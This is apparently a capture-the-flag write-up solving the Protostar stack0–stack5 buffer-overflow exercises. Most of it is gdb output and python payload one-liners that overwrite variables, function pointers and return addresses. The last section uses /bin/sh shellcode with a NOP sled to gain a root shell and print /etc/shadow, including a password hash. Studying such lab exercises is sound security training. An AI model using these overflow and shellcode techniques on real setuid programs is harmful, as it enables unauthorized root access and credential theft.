# Stack 0
Entering any amount of characters > 64 overflows the buffer and lets us modify the variable.
```
(gdb) break *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) x/24wx $esp
0xbffff6f0:	0xbffff70c	0x00000001	0xb7fff8f8	0xb7f0186e
0xbffff700:	0xb7fd7ff4	0xb7ec6165	0xbffff718	0x41414141
0xbffff710:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff730:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff740:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) c
Continuing.
you have changed the 'modified' variable
```

# Stack 1
Ghidra correctly tells us that we need to set the `target` variable to `0x61626364` in order to pass this challenge
```c
  if (target == 0x61626364) {
    puts("you have correctly got the variable to the right value");
  }
```
```bash
user@protostar:/opt/protostar/bin$ ./stack1 $(python -c 'print "A"*64+"\x64\x63\x62\x61"')
you have correctly got the variable to the right value
```

# Stack 2
```c
  string = getenv("GREENIE");
  if (string == (char *)0x0) {
    errx(1,"please set the GREENIE environment variable\n");
  }
  var = 0;
  strcpy(buffer,string);
  if (var == 0xd0a0d0a) {
    puts("you have correctly modified the variable");
  }
```
so to set `var` to `0x 0d 0a 0d 0a` we overflow the buffer using the environment variable GREENIE
```bash
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c 'print "A"*64+"\x0a\x0d\x0a\x0d"')
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

# Stack 3
We need to overflow buffer such that the var is overwritten to 0x08048424 by overwriting it with 0x24840408 (little endian) which will call win function

```bash
user@protostar:/opt/protostar/bin$ python -c 'print "A"*64+"\x24\x84\x04\x08"' | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

# Stack 4
Ghidra and gdb help us locate win function .
```gdb
(gdb) x win
0x80483f4 <win>:	0x83e58955
```
although for some reason ghidra calculated the buffer size wrong for this challenge 
```c
void main(int argc,char **argv)

{
  char buffer [64]; // size is shown as 76 by ghidra
  
  gets(buffer);
/* we need to overflow buffer such that when the program returns, it should
    execute our win function located at 0x080483f4 */
  return;
}
```
Entering string `AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ` as input and analyzing in gdb we see that error message says

```gdb
(gdb) r < /tmp/test
Starting program: /opt/protostar/bin/stack4 < /tmp/test

Program received signal SIGSEGV, Segmentation fault.
0xbffff760:	0x55555555	0x56565656	0x57575757	0x58585858
0xbffff770:	0xbffff700	0xffffffff	0xb7ffeff4	0x0804824b
0xbffff780:	0x00000001	0xbffff7c0	0xb7ff0626	0xb7fffab0
0xbffff790:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
0xbffff7a0:	0xbffff7d8	0xf138b066	0xdb6e0676	0x00000000
0xbffff7b0:	0x00000000	0x00000000	0x00000001	0x08048340
0xbffff7c0:	0x00000000	0xb7ff6210	0xb7eadb9b	0xb7ffeff4
0xbffff7d0:	0x00000001	0x08048340	0x00000000	0x08048361
0xbffff7e0:	0x08048408	0x00000001	0xbffff804	0x08048430
eax            0xbffff710	-1073744112
ecx            0xbffff710	-1073744112
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff760	0xbffff760
ebp            0x53535353	0x53535353
esi            0x0	0
edi            0x0	0
eip            0x54545454	0x54545454
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0x54545454:	Error while running hook_stop:
Cannot access memory at address 0x54545454
0x54545454 in ?? ()
```

- From this, we find that the program tried to return to `0x54545454` from the error message `Cannot access memory at address 0x54545454`.
- ebp is overwritten to `0x53535353` (character S)
- eip is overwritten to `0x54545454` (character T)

so writing an exploit that overwrites eip to location of win function [scripts/stack4.py](scripts/stack4.py)

- i did spend a lot of time in gdb trying to find why it wasn't working because i forgot to look up and see the words `code flow successfully changed` so don't do that.
```gdb
(gdb) c
Continuing.
code flow successfully changed

Program received signal SIGSEGV, Segmentation fault.
0xbffff764:	0xbffff804	0xbffff80c	0xb7fe1848	0xbffff7c0
0xbffff774:	0xffffffff	0xb7ffeff4	0x0804824b	0x00000001
0xbffff784:	0xbffff7c0	0xb7ff0626	0xb7fffab0	0xb7fe1b28
0xbffff794:	0xb7fd7ff4	0x00000000	0x00000000	0xbffff7d8
0xbffff7a4:	0x85702a6e	0xaf269c7e	0x00000000	0x00000000
0xbffff7b4:	0x00000000	0x00000001	0x08048340	0x00000000
0xbffff7c4:	0xb7ff6210	0xb7eadb9b	0xb7ffeff4	0x00000001
0xbffff7d4:	0x08048340	0x00000000	0x08048361	0x08048408
0xbffff7e4:	0x00000001	0xbffff804	0x08048430	0x08048420
eax            0x1f	31
ecx            0xb7fd84c0	-1208122176
edx            0xb7fd9340	-1208118464
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff764	0xbffff764
ebp            0x53535353	0x53535353
esi            0x0	0
edi            0x0	0
eip            0x0	0
eflags         0x210246	[ PF ZF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0x0:	Error while running hook_stop:
Cannot access memory at address 0x0
0x00000000 in ?? ()
```

Finally Running the exploit on the vm 
```bash
user@protostar:/opt/protostar/bin$ python /tmp/stack4.py | ./stack4
code flow successfully changed
Segmentation fault
```
So cool ! (even though it ends with a segmentation fault)


# Stack 5

- We can overwrite the return pointer to return to the stack and then use a NOP Slide to control the execution

- We find shellcode to spawn a /bin/sh shell from [http://shell-storm.org/shellcode/files/shellcode-827.php](http://shell-storm.org/shellcode/files/shellcode-827.php)

```gdb
(gdb) r < /tmp/stack5
Starting program: /opt/protostar/bin/stack5 < /tmp/stack5

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x90909098
) at stack5/stack5.c:11
11	in stack5/stack5.c
(gdb) info registers
eax            0xbffff710	-1073744112
ecx            0xbffff710	-1073744112
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff75c	0xbffff75c
ebp            0x90909090	0x90909090
esi            0x0	0
edi            0x0	0
eip            0x80483da	0x80483da <main+22>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x/60wx $esp
0xbffff75c:	0xbffff7ca	0x90909090	0x90909090	0x90909090
0xbffff76c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff77c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff78c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff79c:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7ac:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7bc:	0x90909090	0x90909090	0xc0313378	0x2f2f6850
0xbffff7cc:	0x2f686873	0x896e6962	0x895350e3	0xcd0bb0e1
0xbffff7dc:	0x08040080	0x080483c4	0x00000001	0xbffff804
0xbffff7ec:	0x080483f0	0x080483e0	0xb7ff1040	0xbffff7fc
0xbffff7fc:	0xb7fff8f8	0x00000001	0xbffff92e	0x00000000
0xbffff80c:	0xbffff948	0xbffff952	0xbffff974	0xbffff988
0xbffff81c:	0xbffff990	0xbffff9a0	0xbffff9b2	0xbffff9c5
0xbffff82c:	0xbffffa12	0xbffffa1f	0xbffffa2e	0xbffffa39
0xbffff83c:	0xbffffa4d	0xbffffa8b	0xbffffa9c	0xbfffff8c
(gdb) 
```
- Exploit script that executes /bin/sh using shellcode : [scripts/stack5.py](scripts/stack5.py)

Executing this exploit ..we get  *< nothing >*
```bash
user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5
user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5
user@protostar:/tmp$ python stack5.py | /opt/protostar/bin/stack5
```
because `STDIN` of the spawned `/bin/sh` is connected to `STDOUT` of python stack5.py command ... and as that process is killed, the child process dies too . we can use cat here, to get a reverse shell ...

```bash
user@protostar:/tmp$ (python stack5.py;cat) | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
head -n 5 /etc/shadow
root:$6$gOA4/iAf$EMw.4yshZLZxjlf./VmnEVQ20QsEmdzZa73csPGYGG6KC.riaGhLmESwWwB7Rnntu5JCDnRnOUTeeYWQk.iUq0:15302:0:99999:7:::
daemon:*:15300:0:99999:7:::
bin:*:15300:0:99999:7:::
sys:*:15300:0:99999:7:::
sync:*:15300:0:99999:7:::
...
```